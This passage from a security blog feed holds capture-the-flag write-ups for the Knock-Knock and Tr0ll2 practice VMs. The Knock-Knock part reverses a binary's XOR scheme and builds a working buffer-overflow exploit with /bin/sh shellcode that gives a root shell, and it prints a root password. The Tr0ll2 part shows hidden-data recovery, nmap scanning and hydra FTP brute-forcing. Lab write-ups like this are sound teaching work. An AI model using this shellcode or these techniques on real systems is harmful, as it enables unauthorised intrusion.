&lt;p&gt;Once inside the loop (and this is the part that for me was the hardest!!!) we see the line &lt;code&gt;*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;&lt;/code&gt;. What helped me understand what is going on here was to understand that &lt;code&gt;var_10&lt;/code&gt; (which is the content of our file) is being passed by reference. So, &lt;code&gt;var_4 * 4&lt;/code&gt; is essentially &lt;code&gt;i*4&lt;/code&gt; of the contents, or &lt;code&gt;content[i*4]&lt;/code&gt; in python, which is the 4 bytes from &lt;code&gt;var_4&lt;/code&gt;. These 4 bytes are being xored by &lt;code&gt;var_C&lt;/code&gt;, replacing the original 4 bytes in &lt;code&gt;var_10&lt;/code&gt;, to the new xored ones.&lt;/p&gt;

&lt;p&gt;So what can we deduce then? The hardcoded base encryption key for &lt;code&gt;tfc&lt;/code&gt; is &lt;code&gt;0xea1ab19f&lt;/code&gt;. Cool eh! But ok lets move on.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;var_8 = 0x0;
while (var_8 &amp;lt;= 0x7) {
        if ((var_C &amp;amp; 0x1) != 0x0) {
                var_C = var_C &amp;gt;&amp;gt; 0x1;
                var_C = var_C ^ 0x6daa1cf4;
        }
        else {
                var_C = var_C &amp;gt;&amp;gt; 0x1;
        }
        var_8 = var_8 + 0x1;
}
var_4 = var_4 + 0x1;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from &lt;code&gt;while (0x0 &amp;lt;= 0x7) {&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once the loop has started, we see a bitwise &lt;code&gt;and&lt;/code&gt; occur that checks if the key (&lt;code&gt;var_C&lt;/code&gt;) &amp;amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with &lt;code&gt;0x6daa1cf4&lt;/code&gt;. Why &lt;code&gt;0x6daa1cf4&lt;/code&gt;? Well, should the key ever become &lt;code&gt;1111 1111 1111 1111&lt;/code&gt; (in binary), then any bitshifts will have no effect. If the &lt;code&gt;and&lt;/code&gt; does not result in 0, just shift the bits.&lt;/p&gt;

&lt;p&gt;This occurs for 8 runs.&lt;/p&gt;

&lt;p&gt;So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.&lt;/p&gt;

&lt;p&gt;Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.&lt;/p&gt;

&lt;p&gt;That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&amp;rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;var_14 = arg_4 &amp;amp; 0xfffffffc;
var_4 = 0x0;
while ((arg_4 &amp;amp; 0x3) &amp;gt; var_4) {
        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp;amp; 0xff);
        var_C = var_C &amp;gt;&amp;gt; 0x8;
        var_4 = var_4 + 0x1;
}
return 0x0;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-encryption-logic-replicated&#34;&gt;the encryption logic replicated&lt;/h2&gt;

&lt;p&gt;While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

import struct

# Hopper Pseudo Code

# int xcrypt(int arg0, int arg1) {
#     var_C = 0xea1ab19f;
#     var_10 = arg_0;
#     var_4 = 0x0;
#     while (arg_4 &amp;gt;&amp;gt; 0x2 &amp;gt; var_4) {
#             *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
#             var_8 = 0x0;
#             while (var_8 &amp;lt;= 0x7) {
#                     if ((var_C &amp;amp; 0x1) != 0x0) {
#                             var_C = var_C &amp;gt;&amp;gt; 0x1;
#                             var_C = var_C ^ 0x6daa1cf4;
#                     }
#                     else {
#                             var_C = var_C &amp;gt;&amp;gt; 0x1;
#                     }
#                     var_8 = var_8 + 0x1;
#             }
#             var_4 = var_4 + 0x1;
#     }
#     var_14 = arg_4 &amp;amp; 0xfffffffc;
#     var_4 = 0x0;
#     while ((arg_4 &amp;amp; 0x3) &amp;gt; var_4) {
#             *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp;amp; 0xff);
#             var_C = var_C &amp;gt;&amp;gt; 0x8;
#             var_4 = var_4 + 0x1;
#     }
#     return 0x0;
# }

def xcrypt(content, length):

    encrypted = &#39;&#39;

    # set the base encryption key. this mutates with each pass
    key = 0xea1ab19f    # var_C = 0xea1ab19f;

    for word in range(length &amp;gt;&amp;gt; 2): # while (arg_4 &amp;gt;&amp;gt; 0x2 &amp;gt; var_4) {
        # apply the encryption logic as can bee seen in
        # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

        # grab the 4 bytes we working with
        bytes = content[word*4:((word*4)+4)]

        # struct unpack_from returns a tuple, we want 0 so that
        # we end up with something we can xor
        long_to_xor = struct.unpack_from(&#39;&amp;lt;L&#39;, bytes)[0]

        # apply the xor, this is the actual encryption part
        encrypted_bytes = long_to_xor ^ key

        # append the 4 encrypted bytes by packing them
        encrypted += struct.pack(&#39;&amp;lt;L&#39;,encrypted_bytes)

        # next we run the key mutation
        for mutation in xrange(8):

            # no mutation is possible of the key is 1111 1111 1111 1111
            if (key &amp;amp; 1) != 0:
                key = key &amp;gt;&amp;gt; 1
                key = key ^ 0x6daa1cf4
            else:
                key = key &amp;gt;&amp;gt; 1

    return encrypted;

if __name__ == &#39;__main__&#39;:

    # set the content that we want to encrypt
    content = &amp;quot;A&amp;quot; *1000
    length = len(content)

    encrypted = xcrypt(content, length)
    print encrypted

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;testing-the-script&#34;&gt;testing the script&lt;/h2&gt;

&lt;p&gt;With the script done I obviously had to test it. I have a buffer of 1000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s as the content and redirected the script output to a file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python make-crypt.py &amp;gt; test.tfc

root@kali:~# head test.tfc
��[�]��C��dl�
              H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;amp;�y�|S[I;R.�+T��w�$͟�7��?i�w&#39;�3�s&amp;lt;A��^��

root@kali:~# ./tfc test.tfc out.tfc
&amp;gt;&amp;gt; File crypted, goodbye!

root@kali:~# head out.tfc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So to recap. We generated a file &lt;code&gt;test.tfc&lt;/code&gt;, which is the encrypted version of 1000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s. We then ran it through &lt;code&gt;tfc&lt;/code&gt; which decrypted it to our cleartext &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s again.&lt;/p&gt;

&lt;h2 id=&#34;finding-eip&#34;&gt;finding EIP&lt;/h2&gt;

&lt;p&gt;With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of &lt;code&gt;41&lt;/code&gt;&amp;rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s, and ran it through &lt;code&gt;gdb&lt;/code&gt; to be able to inspect the Segmentation Fault that occurs.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python make-crypt.py &amp;gt; crash.tfc

root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.

gdb-peda$ r crash.tfc crash-out.tfc

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&#39;\t&#39;)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&#39;AAAA&#39;)
ESP: 0xbffff3d0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
EIP: 0x41414141 (&#39;AAAA&#39;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff3d0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0004| 0xbffff3d4 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0008| 0xbffff3d8 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0012| 0xbffff3dc (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0016| 0xbffff3e0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0020| 0xbffff3e4 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0024| 0xbffff3e8 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0028| 0xbffff3ec (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;BOOM!&lt;/strong&gt; A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up &lt;code&gt;pattern_create&lt;/code&gt; from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s to this pattern and rerun the crash in &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python make-crypt.py &amp;gt; crash.tfc

root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.
gdb-peda$ r crash.tfc crash-out.tfc

[... snip ...]

Stopped reason: SIGSEGV
0x35684634 in ?? ()
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the crash at &lt;code&gt;0x35684634&lt;/code&gt;, we check up with &lt;code&gt;pattern_offset&lt;/code&gt; to see where exactly in that 6000 character buffer this pattern occurs:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
[*] Exact match at offset 4124
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s and then 4 &lt;em&gt;B&lt;/em&gt;&amp;rsquo;s, and padded the rest with &lt;em&gt;C&lt;/em&gt;&amp;rsquo;s up to 6000 characters.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;content = &amp;quot;A&amp;quot; *4124 + &amp;quot;BBBB&amp;quot; + &amp;quot;C&amp;quot;*(6000-4124-4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This resulted in a crash at &lt;code&gt;0x42424242&lt;/code&gt; in &lt;code&gt;gdb&lt;/code&gt; which was perfect!&lt;/p&gt;

&lt;h2 id=&#34;exploiting-tfc&#34;&gt;exploiting tfc&lt;/h2&gt;

&lt;p&gt;The only thing that was left to do was to find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with &lt;code&gt;NO NX&lt;/code&gt;, it should happily execute code on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_jmp_esp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Using Evans Debugger (run with &lt;code&gt;edb --run ./tfc&lt;/code&gt;), I searched for a &lt;em&gt;JMP ESP&lt;/em&gt; instruction and found one in &lt;code&gt;tfc&lt;/code&gt; itself at &lt;code&gt;0x08048e93&lt;/code&gt;. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;content = &amp;quot;A&amp;quot; *4124 + &amp;quot;\x93\x8e\x04\x08&amp;quot; + &amp;quot;C&amp;quot;*(6000-4124-4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, we need some shell code. I just re-used some &lt;code&gt;/bin/sh&lt;/code&gt; shell code I have stashed away for this one, and added it to the buffer after a few NOP&amp;rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;if __name__ == &#39;__main__&#39;:

    # 08048e93  ; jmp esp
    shellcode = (
        &amp;quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68&amp;quot; +
        &amp;quot;\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&amp;quot;
    )

    content = &amp;quot;A&amp;quot; *4124 + &amp;quot;\x93\x8e\x04\x08&amp;quot; + &amp;quot;\x90&amp;quot;*16 + shellcode + &amp;quot;C&amp;quot; *(6000-4124-4-16-len(shellcode))
    length = len(content)

    encrypted = xcrypt(content, length)
    print encrypted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to &lt;code&gt;jason&lt;/code&gt;&amp;rsquo;s home directory and executed it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ python make-crypt.py &amp;gt; crash.tfc &amp;amp;&amp;amp; ./tfc crash.tfc crash-out.tfc
# id
uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pwnd!&lt;/p&gt;

&lt;p&gt;As proof, the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt
 __                         __              __                         __      ____
|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
|    &amp;lt;|   |  (  &amp;lt;_&amp;gt; )  \___|    &amp;lt;  /_____/ |    &amp;lt;|   |  (  &amp;lt;_&amp;gt; )  \___|    &amp;lt;   |   |
|__|_ \___|  /\____/ \___  &amp;gt;__|_ \         |__|_ \___|  /\____/ \___  &amp;gt;__|_ \  |___|
     \/    \/            \/     \/              \/    \/            \/     \/

Hooray you got the flag!

Hope you had as much fun r00ting this as I did making it!

Feel free to hit me up in #vulnhub @ zer0w1re

Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)

root password is &amp;quot;qVx4UJ*zcUdc9#3C$Q&amp;quot;, but you should already have a shell, right? ;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are a number other goodies in /root to check out so be sure to do that!&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Big shoutout to &lt;a href=&#34;https://twitter.com/zer0w1re&#34;&gt;@zer0w1re&lt;/a&gt; for the VM and as always &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting. The learning experience has been invaluable! :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>another troll tamed solving troll 2</title>
      <link>https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/</link>
      <pubDate>Fri, 10 Oct 2014 17:32:35 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/tr0ll-2,107/&#34;&gt;Tr0ll2&lt;/a&gt; is a successor in a boot2root series by &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; hosted over at &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt;. Having been able to &lt;a href=&#34;https://leonjza.github.io/blog/2014/08/15/taming-the-troll/&#34;&gt;pwn Tr0ll1&lt;/a&gt;, I gave this one a shot too.&lt;/p&gt;

&lt;p&gt;Here is my experience taming the troll, again.&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a &lt;code&gt;nmap&lt;/code&gt; against it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-10 06:55 SAST
Nmap scan report for 192.168.56.101
Host is up, received reset (0.00031s latency).
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for &lt;em&gt;vsftpd 2.0.8 exploit&lt;/em&gt; with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&amp;rsquo;t any strange banners etc to be found which was not the case.&lt;/p&gt;

&lt;h2 id=&#34;web-server&#34;&gt;web server&lt;/h2&gt;

&lt;p&gt;Opening up a browser to &lt;a href=&#34;http://192.168.56.101&#34;&gt;http://192.168.56.101&lt;/a&gt; revealed a familiar image:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll2_web.png&#34; /&gt;
    
    
&lt;/figure&gt;

Oh. Hai. The sources serving up the image had the comment &lt;code&gt;&amp;lt;!-- Nothing to see here, but good try NOOB!&amp;gt;&lt;/code&gt; with the image.&lt;/p&gt;

&lt;p&gt;Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/keep_trying
/dont_bother
/noob
/ok_this_is_it
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The content served up at these URLs:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll2_noob.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The source that serves up this image had the comment &lt;code&gt;&amp;lt;!--What did you really think to find here? Try Harder!&amp;gt;&lt;/code&gt; with the image.&lt;/p&gt;

&lt;p&gt;So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&amp;rsquo;s that would 200 into a text file from the &lt;code&gt;robots.txt&lt;/code&gt; and looped over them downloading the images:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# for line in $(cat 200.txt); do echo &amp;quot;==&amp;gt;$line&amp;lt;==&amp;quot; &amp;amp;&amp;amp; wget 192.168.56.101/$line/cat_the_troll.jpg; done

==&amp;gt;/ok_this_is_it&amp;lt;==
--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15831 (15K) [image/jpeg]
Saving to: `cat_the_troll.jpg.3&#39;

100%[=======&amp;gt;] 15,831      --.-K/s   in 0s

2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39; saved [15831/15831]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Immediately when you &lt;code&gt;ls&lt;/code&gt; the directory containing the images will you notice a difference:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ls -l
total 68
-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 #&amp;lt;---
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a &lt;code&gt;cmp&lt;/code&gt; on the files hinted towards what may be up.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sweet, so lets print the last line of both and check what the diff is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
8�z2��p�T�lj\p��?�&amp;lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_�

root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
8�z2��p�T�lj\p��?�&amp;lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self for the answer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;_Look Deep within y0ur&lt;em&gt;self for the answer&lt;/em&gt;. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words _y0ur&lt;em&gt;self&lt;/em&gt; were written differently, I tried to use this as a web path:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll2_y0ur_self.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I downloaded &lt;code&gt;answer.txt&lt;/code&gt; and started to check what is happening inside:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# head answer.txt
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks a lot like base64 hey? Lets try decode it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The resultant output appeared to be a wordlist. A big one too. In fact, it has &lt;strong&gt;99157&lt;/strong&gt; entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a &lt;code&gt;sort | uniq&lt;/code&gt;, the size was reduced to &lt;strong&gt;73128&lt;/strong&gt; which was still too much.&lt;/p&gt;

&lt;p&gt;I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry &lt;strong&gt;ItCantReallyBeThisEasyRightLOL&lt;/strong&gt; on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P&lt;/p&gt;

&lt;p&gt;My guess was that this has to be a password for either the FTP or SSH service.&lt;/p&gt;

&lt;h2 id=&#34;ftpee&#34;&gt;ftpee&lt;/h2&gt;

&lt;p&gt;I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.&lt;/p&gt;

&lt;p&gt;As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in &lt;code&gt;answer.txt&lt;/code&gt;, mutate it a bit and hand it over to hydra to do its work.&lt;/p&gt;

&lt;p&gt;My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran &lt;code&gt;cat wordz |  tr &amp;quot;\&amp;quot;&#39; &amp;quot; &#39;\n&#39; | sort -u &amp;gt;&amp;gt; words&lt;/code&gt; to break it up into a wordlist. Lastly I took the entries had a &lt;code&gt;_&lt;/code&gt; in them and broke them up as single words ie: &lt;code&gt;cat_the_troll.jpg&lt;/code&gt; turned into &lt;code&gt;cat&lt;/code&gt;, &lt;code&gt;the&lt;/code&gt;, &lt;code&gt;troll&lt;/code&gt;. The resultant list can be seen &lt;a href=&#34;https://gist.github.com/leonjza/db5cc19cd62b270a89db&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And finally, it was time to let hydra on the loose.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;&amp;gt;&amp;quot; - 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;404&amp;quot; - 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;again&amp;quot; - 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;agent&amp;quot; - 4 of 13689 [child 3]
[...]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Tr0ll&amp;quot; - pass &amp;quot;Tr0ll&amp;quot; - 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Tr0ll&amp;quot; - pass &amp;quot;tr0ll2&amp;quot; - 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Tr0ll&amp;quot; - pass &amp;quot;tr0ll_again.jpg&amp;quot; - 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After a really, really long time, we finally get a successful combination of &lt;code&gt;Tr0ll:Tr0ll&lt;/code&gt;. Guess I could have guessed that but oh well. Lets see if this gives us any access:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.56.101:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay! Progress! Lets take a closer look&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; pas
Passive mode on.

ftp&amp;gt; ls
227 Entering Passive Mode (192,168,56,101,73,4)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.

ftp&amp;gt; get lmao.zip
local: lmao.zip remote: lmao.zip
227 Entering Passive Mode (192,168,56,101,105,73)
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (621.0 kB/s)

ftp&amp;gt; bye
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;noob-key&#34;&gt;noob key&lt;/h2&gt;

